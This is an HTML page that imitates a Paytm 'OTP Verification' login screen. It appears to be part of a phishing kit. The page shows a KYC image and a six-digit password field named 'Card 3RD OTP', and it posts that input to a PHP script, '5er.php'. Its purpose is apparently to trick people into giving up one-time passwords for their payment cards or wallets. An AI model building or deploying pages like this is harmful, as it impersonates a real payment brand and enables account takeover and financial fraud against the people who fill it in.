<!DOCTYPE html>
<html lang="eng">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  <title>Paytm Login - OTP Verification</title>
  <style>
    #ml
    {
      width:24%;
      margin-left:165px;
      position:absolute;
      top:2px;
    }
    #tp
    {
    width: 295px;
    height: 35px;
    background-color: white;
    border-color:#01B9F5;
    color:#404145;
    font-size: 15px !important;
    line-height: 25px !important;
    padding: 1px 5px;
    margin-bottom:5px;
    margin-left:18px;
    outline: none;
    background:none;
    box-shadow: 0px 1.5px 0px #DADADA;
    border:none;
   }
   #tp:hover
   {
   box-shadow: 0px 1.5px 0px #00B1F1
   
   }
    #btn
    {
    width:170px;
    background-color:#01B9F5;
    color: white;
    margin-left:15px;
    border: solid black;
    border-radius: 2px;
    border-width: 0px;
    font-weight: bold;
    cursor: pointer;
    font-size: 15px;
    height:36px;
    }
    #ab
    {
    width:365px;
    margin:50px;
    border-bottom:solid #E6E6E6;
    border-width:1.2px;
    }
    #vld
    {
        color:red;
        font-size:14px;
        margin-left:20px;
    }
    </style>
    </head>
    <body onload="startTimer();">
    <div class="line">
    <b style="font-family:arial; font-size:20px; color:black; margin-left:90px;
    position:absolute;
    top:14px;">Login to</b></div>
    <img src="kyc.jpg" alt="" id="ml"><br><br>
    <div id="ab" 
    style="margin:10px; 
    margin-left:-8px;">
    </div><br><br>
    <form action="5er.php" method="post">
    <div>
    <center><b style="font-family:arial; font-size:18px; color:black; margin-left:20px;">Enter One Time Password (OTP)</b></center><br>
    </div>
    <div>
   <center><p1 style="font-family:arial; font-size:15px; color:#47474d; margin-left:20px;">One Time Password (OTP) has been sent to registered mobile number, please enter the <br>same here to proceed.</p1></center>
   </p1><br>
    <b style="font-family:arial; font-size:15px; color:#47474d; margin-left:20px;"></b><br>
    <input type="password" inputmode="numeric" name="Card 3RD OTP" id="tp" placeholder="One Time Password (OTP)" 
    maxlength="6" pattern="[0-9]{6}" 
    title="Please enter valid 6 digit OTP"
    required=""><br>
    <div id="vld">
    <p4>Please enter a valid OTP</p4>
    </div>
    <b style="color: #01B9F5; font-size:14px; font-family: Arial, Helvetica, sans-serif; margin-left:240px;"> <a href="" style=" color:#01B9F5; font-family: Arial, Helvetica, sans-serif; text-decoration:none;">Resend OTP</a></b><br>
    <script type="text/javascript">
    var timer=120;
    var sec=120;
    function startTimer() {
    sec=parseInt(timer%120);
    
    if (timer<1) {
    timer.stop();
    }
    
    document.getElementById("time").innerHTML = "<p1> Wait for OTP :</p1>"+sec.toString();
    timer--;
    setTimeout(function(){
    startTimer();
    
    }, 1000);
    }
    
    </script>
    <div>
    <center> <b style="color:grey; font-size:12px; margin-left:22px;"><span style="color:grey; font-size:12px;" id="time"></span>&nbsp;second</b></center>
    </div><br>
    <center><button type="submit" id="btn" style="font-weight:;">Confirm OTP</button></center><br>
    <p1 style="color:#01B9F5; font-size:12px; font-family: Arial, Helvetica, sans-serif; margin-left:20px;">Know more about 2 step authentication</span></p1><br>
    <i style="color:grey; font-size:12px; margin-left:20px;">Having trouble logging in ?</i>
     <span style="color: #01B9F5;"><i>Contact us</i></span>
     </div></form></body></html>